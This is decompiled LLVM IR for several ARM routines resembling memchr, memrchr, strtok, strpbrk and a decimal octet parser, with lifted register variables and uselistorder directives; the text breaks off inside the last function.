define i32 @function_12940(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12940:
  %v3_12940 = load i32, i32* @r4, align 4
  %v6_12940 = load i32, i32* @r5, align 4
  %v9_12940 = load i32, i32* @r6, align 4
  %v1_12944 = urem i32 %arg1, 256
  %v0_1296018 = load i32, i32* @r2, align 4
  %v2_1296020 = icmp eq i32 %v0_1296018, 0
  br i1 %v2_1296020, label %dec_label_pc_12970, label %dec_label_pc_12968

dec_label_pc_1294c:                               ; preds = %dec_label_pc_12968
  %v3_1294c = load i8, i8* %.021, align 1
  %v4_1294c = zext i8 %v3_1294c to i32
  %v9_12950 = icmp eq i32 %v4_1294c, %v1_12944
  %v1_12954 = add i32 %v0_12954, -1
  br i1 %v9_12950, label %bb, label %dec_label_pc_12960

bb:                                               ; preds = %dec_label_pc_1294c
  ret i32 %v1_12968

dec_label_pc_12960:                               ; preds = %dec_label_pc_1294c
  %v2_1295c = add i32 %v1_12968, 1
  %v3_1295c = inttoptr i32 %v2_1295c to i8*
  %v2_12960 = icmp eq i32 %v1_12954, 0
  br i1 %v2_12960, label %dec_label_pc_12970, label %dec_label_pc_12968

dec_label_pc_12968:                               ; preds = %dec_label_pc_12940, %dec_label_pc_12960
  %v0_12954 = phi i32 [ %v1_12954, %dec_label_pc_12960 ], [ %v0_1296018, %dec_label_pc_12940 ]
  %.021 = phi i8* [ %v3_1295c, %dec_label_pc_12960 ], [ undef, %dec_label_pc_12940 ]
  %v1_12968 = ptrtoint i8* %.021 to i32
  %v2_12968 = urem i32 %v1_12968, 4
  %v3_12968 = icmp eq i32 %v2_12968, 0
  br i1 %v3_12968, label %dec_label_pc_12970, label %dec_label_pc_1294c

dec_label_pc_12970:                               ; preds = %dec_label_pc_12960, %dec_label_pc_12968, %dec_label_pc_12940
  %v0_129fc37 = phi i32 [ 0, %dec_label_pc_12940 ], [ 0, %dec_label_pc_12960 ], [ %v0_12954, %dec_label_pc_12968 ]
  %.0.lcssa = phi i8* [ undef, %dec_label_pc_12940 ], [ %v3_1295c, %dec_label_pc_12960 ], [ %.021, %dec_label_pc_12968 ]
  %v4_12970 = mul nuw nsw i32 %v1_12944, 256
  %v5_12970 = or i32 %v4_12970, %v1_12944
  %v1_12974 = ptrtoint i8* %.0.lcssa to i32
  store i32 %v1_12974, i32* @ip, align 4
  %v4_12978 = mul i32 %v5_12970, 65536
  %v5_12978 = or i32 %v4_12978, %v5_12970
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_129fc37, 3
  br i1 %tmp, label %dec_label_pc_12980, label %dec_label_pc_12a24.preheader

dec_label_pc_12980:                               ; preds = %dec_label_pc_12970, %dec_label_pc_129fc.backedge
  %v0_1299c82 = phi i32 [ %v1_1299c, %dec_label_pc_129fc.backedge ], [ %v0_129fc37, %dec_label_pc_12970 ]
  %v0_1298081 = phi i32 [ %v4_12980, %dec_label_pc_129fc.backedge ], [ %v1_12974, %dec_label_pc_12970 ]
  %v1_12980 = inttoptr i32 %v0_1298081 to i32*
  %v2_12980 = load i32, i32* %v1_12980, align 4
  %v4_12980 = add i32 %v0_1298081, 4
  store i32 %v4_12980, i32* @ip, align 4
  %v2_12984 = xor i32 %v2_12980, %v5_12978
  %v2_12988 = add i32 %v2_12984, 2130640639
  %v1_1298c = sub i32 -1, %v2_12984
  %v2_12990 = xor i32 %v2_12988, %v1_1298c
  %v2_12994 = and i32 %v2_12990, -2130640640
  %v2_12998 = icmp eq i32 %v2_12994, 0
  %v1_1299c = add i32 %v0_1299c82, -4
  br i1 %v2_12998, label %dec_label_pc_129fc.backedge, label %dec_label_pc_129a4

dec_label_pc_129fc.backedge:                      ; preds = %dec_label_pc_12980, %dec_label_pc_129e8
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_1299c, 3
  br i1 %tmp107, label %dec_label_pc_12980, label %dec_label_pc_12a24.preheader

dec_label_pc_129a4:                               ; preds = %dec_label_pc_12980
  %v2_129a4 = inttoptr i32 %v0_1298081 to i8*
  %v3_129a4 = load i8, i8* %v2_129a4, align 1
  %v4_129a4 = zext i8 %v3_129a4 to i32
  %v9_129ac = icmp eq i32 %v4_129a4, %v1_12944
  %v1_129b0 = add i32 %v0_1298081, 3
  %v1_129b4 = add i32 %v0_1298081, 1
  store i32 %v1_129b4, i32* @lr, align 4
  %v1_129b8 = add i32 %v0_1298081, 2
  br i1 %v9_129ac, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_129a4
  store i32 %v3_12940, i32* @r4, align 4
  store i32 %v6_12940, i32* @r5, align 4
  store i32 %v9_12940, i32* @r6, align 4
  ret i32 %v0_1298081

bb51:                                             ; preds = %dec_label_pc_129a4
  %v2_129c0 = inttoptr i32 %v1_129b4 to i8*
  %v3_129c0 = load i8, i8* %v2_129c0, align 1
  %v4_129c0 = zext i8 %v3_129c0 to i32
  %v9_129c4 = icmp eq i32 %v4_129c0, %v1_12944
  br i1 %v9_129c4, label %dec_label_pc_129cc, label %dec_label_pc_129d4

dec_label_pc_129cc:                               ; preds = %bb51
  store i32 %v3_12940, i32* @r4, align 4
  store i32 %v6_12940, i32* @r5, align 4
  store i32 %v9_12940, i32* @r6, align 4
  ret i32 %v1_129b4

dec_label_pc_129d4:                               ; preds = %bb51
  %v2_129d4 = inttoptr i32 %v1_129b8 to i8*
  %v3_129d4 = load i8, i8* %v2_129d4, align 1
  %v4_129d4 = zext i8 %v3_129d4 to i32
  %v9_129d8 = icmp eq i32 %v4_129d4, %v1_12944
  br i1 %v9_129d8, label %dec_label_pc_129e0, label %dec_label_pc_129e8

dec_label_pc_129e0:                               ; preds = %dec_label_pc_129d4
  store i32 %v3_12940, i32* @r4, align 4
  store i32 %v6_12940, i32* @r5, align 4
  store i32 %v9_12940, i32* @r6, align 4
  ret i32 %v1_129b8

dec_label_pc_129e8:                               ; preds = %dec_label_pc_129d4
  %v2_129e8 = inttoptr i32 %v1_129b0 to i8*
  %v3_129e8 = load i8, i8* %v2_129e8, align 1
  %v4_129e8 = zext i8 %v3_129e8 to i32
  %v9_129ec = icmp eq i32 %v4_129e8, %v1_12944
  br i1 %v9_129ec, label %dec_label_pc_129f4, label %dec_label_pc_129fc.backedge

dec_label_pc_129f4:                               ; preds = %dec_label_pc_129e8
  store i32 %v3_12940, i32* @r4, align 4
  store i32 %v6_12940, i32* @r5, align 4
  store i32 %v9_12940, i32* @r6, align 4
  ret i32 %v1_129b0

dec_label_pc_12a24.preheader:                     ; preds = %dec_label_pc_129fc.backedge, %dec_label_pc_12970
  %v0_12980.lcssa = phi i32 [ %v1_12974, %dec_label_pc_12970 ], [ %v4_12980, %dec_label_pc_129fc.backedge ]
  %v0_1299c.lcssa = phi i32 [ %v0_129fc37, %dec_label_pc_12970 ], [ %v1_1299c, %dec_label_pc_129fc.backedge ]
  %v2_12a2411 = icmp eq i32 %v0_1299c.lcssa, 0
  br i1 %v2_12a2411, label %dec_label_pc_12a2c, label %dec_label_pc_12a14

dec_label_pc_12a14:                               ; preds = %dec_label_pc_12a24, %dec_label_pc_12a24.preheader
  %v0_12a24.in = phi i32 [ %v0_12a24, %dec_label_pc_12a24 ], [ %v0_1299c.lcssa, %dec_label_pc_12a24.preheader ]
  %v15_12a1c = phi i32 [ %v1_12a20, %dec_label_pc_12a24 ], [ %v0_12980.lcssa, %dec_label_pc_12a24.preheader ]
  %v0_12a24 = add i32 %v0_12a24.in, -1
  %v1_12a14 = inttoptr i32 %v15_12a1c to i8*
  %v2_12a14 = load i8, i8* %v1_12a14, align 1
  %v3_12a14 = zext i8 %v2_12a14 to i32
  %v9_12a18 = icmp eq i32 %v3_12a14, %v1_12944
  br i1 %v9_12a18, label %bb52, label %dec_label_pc_12a24

bb52:                                             ; preds = %dec_label_pc_12a14
  store i32 %v3_12940, i32* @r4, align 4
  store i32 %v6_12940, i32* @r5, align 4
  store i32 %v9_12940, i32* @r6, align 4
  ret i32 %v15_12a1c

dec_label_pc_12a24:                               ; preds = %dec_label_pc_12a14
  %v1_12a20 = add i32 %v15_12a1c, 1
  %v2_12a24 = icmp eq i32 %v0_12a24, 0
  br i1 %v2_12a24, label %dec_label_pc_12a2c, label %dec_label_pc_12a14

dec_label_pc_12a2c:                               ; preds = %dec_label_pc_12a24, %dec_label_pc_12a24.preheader
  store i32 %v3_12940, i32* @r4, align 4
  store i32 %v6_12940, i32* @r5, align 4
  store i32 %v9_12940, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_12a1c, { 1, 0, 2 }
  uselistorder i32 %v1_1299c, { 1, 0, 2 }
  uselistorder i32 %v4_12980, { 0, 2, 1 }
  uselistorder i32 %v0_1298081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_12970, { 1, 0 }
  uselistorder i32 %v0_129fc37, { 1, 2, 0 }
  uselistorder i32 %v1_12944, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_12940, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_129fc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_12980, { 1, 0 }
  uselistorder label %dec_label_pc_12970, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12968, { 1, 0 }
}

define i32 @function_12a3c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12a3c:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_12a48 = call i32 @function_ef60()
  %v0_12a4c = load i32, i32* @r5, align 4
  %v1_12a4c = load i32, i32* @r4, align 4
  %v2_12a4c = add i32 %v1_12a4c, %v0_12a4c
  ret i32 %v2_12a4c
}

define i32 @function_12a54(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12a54:
  %v3_12a54 = load i32, i32* @r4, align 4
  %v1_12a58 = urem i32 %arg2, 256
  %v2_12a5c = add i32 %arg3, %arg1
  %v2_12a742 = icmp eq i32 %arg3, 0
  br i1 %v2_12a742, label %dec_label_pc_12a84, label %dec_label_pc_12a7c

dec_label_pc_12a64:                               ; preds = %dec_label_pc_12a7c
  %v1_12a64 = add i32 %v0_12a64, -1
  %v2_12a64 = inttoptr i32 %v1_12a64 to i8*
  %v3_12a64 = load i8, i8* %v2_12a64, align 1
  %v4_12a64 = zext i8 %v3_12a64 to i32
  %v9_12a68 = icmp eq i32 %v4_12a64, %v1_12a58
  br i1 %v9_12a68, label %bb, label %dec_label_pc_12a74

bb:                                               ; preds = %dec_label_pc_12a64
  ret i32 %v1_12a64

dec_label_pc_12a74:                               ; preds = %dec_label_pc_12a64
  %v1_12a70 = add i32 %v0_12a70, -1
  %v2_12a74 = icmp eq i32 %v1_12a70, 0
  br i1 %v2_12a74, label %dec_label_pc_12a84, label %dec_label_pc_12a7c

dec_label_pc_12a7c:                               ; preds = %dec_label_pc_12a54, %dec_label_pc_12a74
  %v0_12a70 = phi i32 [ %v1_12a70, %dec_label_pc_12a74 ], [ %arg3, %dec_label_pc_12a54 ]
  %v0_12a64 = phi i32 [ %v1_12a64, %dec_label_pc_12a74 ], [ %v2_12a5c, %dec_label_pc_12a54 ]
  %v1_12a7c = urem i32 %v0_12a64, 4
  %v2_12a7c = icmp eq i32 %v1_12a7c, 0
  br i1 %v2_12a7c, label %dec_label_pc_12a84, label %dec_label_pc_12a64

dec_label_pc_12a84:                               ; preds = %dec_label_pc_12a74, %dec_label_pc_12a7c, %dec_label_pc_12a54
  %v0_12b1c11 = phi i32 [ %v2_12a5c, %dec_label_pc_12a54 ], [ %v1_12a64, %dec_label_pc_12a74 ], [ %v0_12a64, %dec_label_pc_12a7c ]
  %v0_12b087 = phi i32 [ 0, %dec_label_pc_12a54 ], [ 0, %dec_label_pc_12a74 ], [ %v0_12a70, %dec_label_pc_12a7c ]
  %v4_12a84 = mul nuw nsw i32 %v1_12a58, 256
  %v5_12a84 = or i32 %v4_12a84, %v1_12a58
  %v4_12a88 = mul i32 %v5_12a84, 65536
  %v5_12a88 = or i32 %v4_12a88, %v5_12a84
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_12b087, 3
  br i1 %tmp, label %dec_label_pc_12a90, label %dec_label_pc_12b18

dec_label_pc_12a90:                               ; preds = %dec_label_pc_12a84, %.backedge.backedge
  %v0_12aac51 = phi i32 [ %v1_12aac, %.backedge.backedge ], [ %v0_12b087, %dec_label_pc_12a84 ]
  %v0_12a9050 = phi i32 [ %v1_12a90, %.backedge.backedge ], [ %v0_12b1c11, %dec_label_pc_12a84 ]
  %v1_12a90 = add i32 %v0_12a9050, -4
  %v2_12a90 = inttoptr i32 %v1_12a90 to i32*
  %v3_12a90 = load i32, i32* %v2_12a90, align 4
  %v2_12a94 = xor i32 %v3_12a90, %v5_12a88
  %v2_12a98 = add i32 %v2_12a94, 2130640639
  %v1_12a9c = sub i32 -1, %v2_12a94
  %v2_12aa0 = xor i32 %v2_12a98, %v1_12a9c
  %v2_12aa4 = and i32 %v2_12aa0, -2130640640
  %v2_12aa8 = icmp eq i32 %v2_12aa4, 0
  %v1_12aac = add i32 %v0_12aac51, -4
  br i1 %v2_12aa8, label %.backedge.backedge, label %dec_label_pc_12ab4

dec_label_pc_12ab4:                               ; preds = %dec_label_pc_12a90
  %v1_12ab4 = add i32 %v0_12a9050, -1
  %v2_12ab4 = inttoptr i32 %v1_12ab4 to i8*
  %v3_12ab4 = load i8, i8* %v2_12ab4, align 1
  %v4_12ab4 = zext i8 %v3_12ab4 to i32
  %v9_12ab8 = icmp eq i32 %v4_12ab4, %v1_12a58
  %v1_12abc = add i32 %v0_12a9050, -2
  store i32 %v1_12abc, i32* @ip, align 4
  %v1_12ac4 = add i32 %v0_12a9050, -3
  store i32 %v1_12ac4, i32* @lr, align 4
  br i1 %v9_12ab8, label %dec_label_pc_12acc, label %dec_label_pc_12ad4

dec_label_pc_12acc:                               ; preds = %dec_label_pc_12ab4
  store i32 %v3_12a54, i32* @r4, align 4
  ret i32 %v1_12ab4

dec_label_pc_12ad4:                               ; preds = %dec_label_pc_12ab4
  %v2_12ad4 = inttoptr i32 %v1_12abc to i8*
  %v3_12ad4 = load i8, i8* %v2_12ad4, align 1
  %v4_12ad4 = zext i8 %v3_12ad4 to i32
  %v9_12ad8 = icmp eq i32 %v4_12ad4, %v1_12a58
  br i1 %v9_12ad8, label %dec_label_pc_12ae0, label %dec_label_pc_12ae8

dec_label_pc_12ae0:                               ; preds = %dec_label_pc_12ad4
  store i32 %v3_12a54, i32* @r4, align 4
  ret i32 %v1_12abc

dec_label_pc_12ae8:                               ; preds = %dec_label_pc_12ad4
  %v2_12ae8 = inttoptr i32 %v1_12ac4 to i8*
  %v3_12ae8 = load i8, i8* %v2_12ae8, align 1
  %v4_12ae8 = zext i8 %v3_12ae8 to i32
  %v9_12aec = icmp eq i32 %v4_12ae8, %v1_12a58
  br i1 %v9_12aec, label %dec_label_pc_12af4, label %dec_label_pc_12afc

dec_label_pc_12af4:                               ; preds = %dec_label_pc_12ae8
  store i32 %v3_12a54, i32* @r4, align 4
  ret i32 %v1_12ac4

dec_label_pc_12afc:                               ; preds = %dec_label_pc_12ae8
  %v1_12afc = inttoptr i32 %v1_12a90 to i8*
  %v2_12afc = load i8, i8* %v1_12afc, align 1
  %v3_12afc = zext i8 %v2_12afc to i32
  %v9_12b00 = icmp eq i32 %v3_12afc, %v1_12a58
  br i1 %v9_12b00, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_12afc, %dec_label_pc_12a90
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_12aac, 3
  br i1 %tmp70, label %dec_label_pc_12a90, label %dec_label_pc_12b18

bb19:                                             ; preds = %dec_label_pc_12afc
  store i32 %v3_12a54, i32* @r4, align 4
  ret i32 %v1_12a90

dec_label_pc_12b1c:                               ; preds = %dec_label_pc_12b18
  %v1_12b28 = add i32 %v0_12b28, -1
  %v1_12b1c = add i32 %v0_12b1c, -1
  %v2_12b1c = inttoptr i32 %v1_12b1c to i8*
  %v3_12b1c = load i8, i8* %v2_12b1c, align 1
  %v4_12b1c = zext i8 %v3_12b1c to i32
  %v9_12b20 = icmp eq i32 %v4_12b1c, %v1_12a58
  br i1 %v9_12b20, label %bb20, label %dec_label_pc_12b18

bb20:                                             ; preds = %dec_label_pc_12b1c
  store i32 %v3_12a54, i32* @r4, align 4
  ret i32 %v1_12b1c

dec_label_pc_12b18:                               ; preds = %dec_label_pc_12a84, %.backedge.backedge, %dec_label_pc_12b1c
  %v0_12b1c = phi i32 [ %v1_12b1c, %dec_label_pc_12b1c ], [ %v0_12b1c11, %dec_label_pc_12a84 ], [ %v1_12a90, %.backedge.backedge ]
  %v0_12b28 = phi i32 [ %v1_12b28, %dec_label_pc_12b1c ], [ %v0_12b087, %dec_label_pc_12a84 ], [ %v1_12aac, %.backedge.backedge ]
  %v2_12b28 = icmp eq i32 %v0_12b28, 0
  br i1 %v2_12b28, label %dec_label_pc_12b30, label %dec_label_pc_12b1c

dec_label_pc_12b30:                               ; preds = %dec_label_pc_12b18
  store i32 %v3_12a54, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_12b28, { 1, 0 }
  uselistorder i32 %v1_12aac, { 1, 0, 2 }
  uselistorder i32 %v1_12a90, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_12a9050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_12a84, { 1, 0 }
  uselistorder i32 %v0_12b087, { 1, 2, 0 }
  uselistorder i32 %v0_12a64, { 1, 0, 2 }
  uselistorder i32 %v1_12a64, { 0, 2, 1, 3 }
  uselistorder i32 %v2_12a5c, { 1, 0 }
  uselistorder i32 %v1_12a58, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_12a54, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12b18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12a90, { 1, 0 }
  uselistorder label %dec_label_pc_12a84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12a7c, { 1, 0 }
}

define i32 @function_12b40() local_unnamed_addr {
dec_label_pc_12b40:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12b40 = load i32, i32* @r4, align 4
  store i32 %v3_12b40, i32* %stack_var_-16, align 4
  %v6_12b40 = load i32, i32* @r5, align 4
  %v0_12b44 = load i32, i32* @r0, align 4
  store i32 %v0_12b44, i32* %r4.global-to-local, align 4
  %v2_12b44 = icmp eq i32 %v0_12b44, 0
  %v1_12b48 = load i32, i32* @r2, align 4
  br i1 %v2_12b44, label %bb, label %dec_label_pc_12b40._crit_edge

bb:                                               ; preds = %dec_label_pc_12b40
  %v2_12b48 = inttoptr i32 %v1_12b48 to i32*
  %v3_12b48 = load i32, i32* %v2_12b48, align 4
  store i32 %v3_12b48, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12b40._crit_edge

dec_label_pc_12b40._crit_edge:                    ; preds = %dec_label_pc_12b40, %bb
  %v0_12b4c = phi i32 [ %v3_12b48, %bb ], [ %v0_12b44, %dec_label_pc_12b40 ]
  store i32 %v0_12b4c, i32* @r0, align 4
  store i32 %v1_12b48, i32* @r5, align 4
  %v0_12b54 = load i32, i32* @r1, align 4
  store i32 %v0_12b54, i32* %r6.global-to-local, align 4
  %v1_12b58 = inttoptr i32 %v0_12b4c to i8*
  %v2_12b58 = call i32 @function_13e5c(i8* %v1_12b58)
  %v0_12b5c = load i32, i32* %r4.global-to-local, align 4
  %v2_12b5c = add i32 %v0_12b5c, %v2_12b58
  %v3_12b5c = inttoptr i32 %v2_12b5c to i8*
  %v4_12b5c = load i8, i8* %v3_12b5c, align 1
  %v6_12b5c = zext i8 %v4_12b5c to i32
  store i32 %v6_12b5c, i32* %r3.global-to-local, align 4
  store i32 %v2_12b5c, i32* @r4, align 4
  %v2_12b64 = icmp eq i8 %v4_12b5c, 0
  store i1 %v2_12b64, i1* @cpsr_z, align 1
  %v0_12b68 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12b68, i32* @r1, align 4
  store i32 %v2_12b5c, i32* @r0, align 4
  br i1 %v2_12b64, label %bb7, label %dec_label_pc_12b78

bb7:                                              ; preds = %dec_label_pc_12b40._crit_edge
  %v2_12b70 = load i32, i32* @r5, align 4
  %v3_12b70 = inttoptr i32 %v2_12b70 to i32*
  store i32 %v2_12b5c, i32* %v3_12b70, align 4
  br label %dec_label_pc_12bac

dec_label_pc_12b78:                               ; preds = %dec_label_pc_12b40._crit_edge
  %v0_12b78 = call i32 @function_12bb4()
  store i32 %v0_12b78, i32* %r2.global-to-local, align 4
  %v3_12b7c = icmp eq i32 %v0_12b78, 0
  store i1 %v3_12b7c, i1* @cpsr_z, align 1
  br i1 %v3_12b7c, label %dec_label_pc_12b8c, label %dec_label_pc_12b9c

dec_label_pc_12b8c:                               ; preds = %dec_label_pc_12b78
  %v0_12b84 = load i32, i32* @r4, align 4
  %v2_12b8c = call i32 @function_13cdc(i32 %v0_12b84, i32 0)
  %v0_12b90 = load i32, i32* @r4, align 4
  store i32 %v0_12b90, i32* %r3.global-to-local, align 4
  %v1_12b94 = load i32, i32* @r5, align 4
  %v2_12b94 = inttoptr i32 %v1_12b94 to i32*
  store i32 %v2_12b8c, i32* %v2_12b94, align 4
  br label %dec_label_pc_12bac

dec_label_pc_12b9c:                               ; preds = %dec_label_pc_12b78
  %v3_12ba0 = inttoptr i32 %v0_12b78 to i8*
  store i8 0, i8* %v3_12ba0, align 1
  %v4_12ba0 = load i32, i32* %r2.global-to-local, align 4
  %v5_12ba0 = add i32 %v4_12ba0, 1
  store i32 %v5_12ba0, i32* @r2, align 4
  %v1_12ba4 = load i32, i32* @r5, align 4
  %v2_12ba4 = inttoptr i32 %v1_12ba4 to i32*
  store i32 %v5_12ba0, i32* %v2_12ba4, align 4
  %v0_12ba8 = load i32, i32* @r4, align 4
  store i32 %v0_12ba8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12bac

dec_label_pc_12bac:                               ; preds = %bb7, %dec_label_pc_12b8c, %dec_label_pc_12b9c
  %v0_12bac = load i32, i32* %r3.global-to-local, align 4
  %v2_12bb0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12bb0, i32* @r4, align 4
  store i32 %v6_12b40, i32* @r5, align 4
  ret i32 %v0_12bac

; uselistorder directives
  uselistorder i32 %v0_12b4c, { 1, 0 }
  uselistorder i32 %v0_12b44, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12bac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12b40._crit_edge, { 1, 0 }
}

define i32 @function_12bb4() local_unnamed_addr {
dec_label_pc_12bb4:
  %v0_12bb4 = load i32, i32* @r0, align 4
  %v1_12bd82 = inttoptr i32 %v0_12bb4 to i8*
  %v2_12bd83 = load i8, i8* %v1_12bd82, align 1
  %v3_12bd84 = zext i8 %v2_12bd83 to i32
  %v2_12bdc5 = icmp eq i8 %v2_12bd83, 0
  br i1 %v2_12bdc5, label %dec_label_pc_12bd8._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %dec_label_pc_12bb4
  %v0_12be4.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_12bbc:                               ; preds = %dec_label_pc_12bc4
  %v1_12bcc = add i32 %v0_12bcc, 1
  %v9_12bbc = icmp eq i32 %v3_12bc4, %v3_12bd86
  br i1 %v9_12bbc, label %dec_label_pc_12bec, label %dec_label_pc_12bc4

dec_label_pc_12bc4:                               ; preds = %dec_label_pc_12bbc, %bb
  %v0_12bcc = phi i32 [ %v1_12bcc, %dec_label_pc_12bbc ], [ %v0_12be4.pre, %bb ]
  %v1_12bc4 = inttoptr i32 %v0_12bcc to i8*
  %v2_12bc4 = load i8, i8* %v1_12bc4, align 1
  %v3_12bc4 = zext i8 %v2_12bc4 to i32
  store i32 %v3_12bc4, i32* @ip, align 4
  %v2_12bc8 = icmp eq i8 %v2_12bc4, 0
  br i1 %v2_12bc8, label %dec_label_pc_12bd4, label %dec_label_pc_12bbc

dec_label_pc_12bd4:                               ; preds = %dec_label_pc_12bc4
  %v1_12bd4 = add i32 %v0_12bd4, 1
  %v1_12bd8 = inttoptr i32 %v1_12bd4 to i8*
  %v2_12bd8 = load i8, i8* %v1_12bd8, align 1
  %v3_12bd8 = zext i8 %v2_12bd8 to i32
  %v2_12bdc = icmp eq i8 %v2_12bd8, 0
  br i1 %v2_12bdc, label %dec_label_pc_12bd8._crit_edge, label %bb

dec_label_pc_12bd8._crit_edge:                    ; preds = %dec_label_pc_12bd4, %dec_label_pc_12bb4
  %v3_12bd8.lcssa = phi i32 [ %v3_12bd84, %dec_label_pc_12bb4 ], [ %v3_12bd8, %dec_label_pc_12bd4 ]
  ret i32 %v3_12bd8.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_12bd4
  %v0_12bd4 = phi i32 [ %v0_12bb4, %.lr.ph ], [ %v1_12bd4, %dec_label_pc_12bd4 ]
  %v3_12bd86 = phi i32 [ %v3_12bd84, %.lr.ph ], [ %v3_12bd8, %dec_label_pc_12bd4 ]
  br label %dec_label_pc_12bc4

dec_label_pc_12bec:                               ; preds = %dec_label_pc_12bbc
  ret i32 %v0_12bd4

; uselistorder directives
  uselistorder i32 %v3_12bd8, { 1, 0 }
  uselistorder i32 %v3_12bc4, { 1, 0 }
  uselistorder i32 %v0_12bcc, { 1, 0 }
  uselistorder i32 %v3_12bd84, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_12bc4, { 1, 0 }
}

define i32 @function_12bf4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12bf4:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_12bf4 = load i32, i32* %r0.global-to-local, align 4
  %v2_12bf4 = icmp eq i32 %v0_12bf4, 0
  %v3_12bf8 = load i32, i32* @r4, align 4
  store i32 %v3_12bf8, i32* %stack_var_-20, align 4
  br i1 %v2_12bf4, label %dec_label_pc_12cd4, label %dec_label_pc_12c10.lr.ph

dec_label_pc_12c10:                               ; preds = %dec_label_pc_12c10.lr.ph, %dec_label_pc_12c94
  %v1_12c94 = phi i32 [ 0, %dec_label_pc_12c10.lr.ph ], [ %v5_12c94, %dec_label_pc_12c94 ]
  %v0_12c98 = phi i32 [ 1, %dec_label_pc_12c10.lr.ph ], [ %v1_12c98, %dec_label_pc_12c94 ]
  %v0_12c18 = phi i32 [ %v0_12bf4, %dec_label_pc_12c10.lr.ph ], [ %v0_12c1825, %dec_label_pc_12c94 ]
  store i32 %v2_12c14.pre, i32* @lr, align 4
  %v1_12c18 = inttoptr i32 %v0_12c18 to i8*
  %v2_12c18 = load i8, i8* %v1_12c18, align 1
  %v3_12c18 = zext i8 %v2_12c18 to i32
  %v3_12c1c = mul nuw nsw i32 %v3_12c18, 2
  %v4_12c1c = add i32 %v3_12c1c, %v2_12c14.pre
  %v5_12c1c = inttoptr i32 %v4_12c1c to i8*
  %v6_12c1c = load i8, i8* %v5_12c1c, align 1
  %v1_12c20 = and i8 %v6_12c1c, 8
  %v2_12c20 = icmp eq i8 %v1_12c20, 0
  br i1 %v2_12c20, label %dec_label_pc_12cd4, label %dec_label_pc_12c28

dec_label_pc_12c28:                               ; preds = %dec_label_pc_12c10
  br label %dec_label_pc_12c48

dec_label_pc_12c30:                               ; preds = %dec_label_pc_12c48
  %v3_12c34 = mul i32 %v0_12c94, 10
  %v4_12c34 = add i32 %v3_12c48, %v3_12c34
  %v1_12c38 = add i32 %v4_12c34, -48
  %v8_12c40 = icmp sgt i32 %v1_12c38, 255
  br i1 %v8_12c40, label %dec_label_pc_12cd4, label %dec_label_pc_12c44

dec_label_pc_12c44:                               ; preds = %dec_label_pc_12c30
  %v1_12c44 = add i32 %v0_12c84, 1
  store i32 %v1_12c44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12c48

dec_label_pc_12c48:                               ; preds = %dec_label_pc_12c28, %dec_label_pc_12c44
  %v0_12c94 = phi i32 [ 0, %dec_label_pc_12c28 ], [ %v1_12c38, %dec_label_pc_12c44 ]
  %v0_12c84 = phi i32 [ %v0_12c18, %dec_label_pc_12c28 ], [ %v1_12c44, %dec_label_pc_12c44 ]
  %v1_12c48 = inttoptr i32 %v0_12c84 to i8*
  %v2_12c48 = load i8, i8* %v1_12c48, align 1
  %v3_12c48 = zext i8 %v2_12c48 to i32
  %v2_12c4c = mul nuw nsw i32 %v3_12c48, 2
  %v2_12c50 = add i32 %v2_12c4c, %v2_12c14.pre
  %v3_12c54 = inttoptr i32 %v2_12c50 to i8*
  %v4_12c54 = load i8, i8* %v3_12c54, align 1
  %v6_12c54 = zext i8 %v4_12c54 to i32
  %v1_12c60 = and i32 %v6_12c54, 8
  %v2_12c60 = icmp eq i32 %v1_12c60, 0
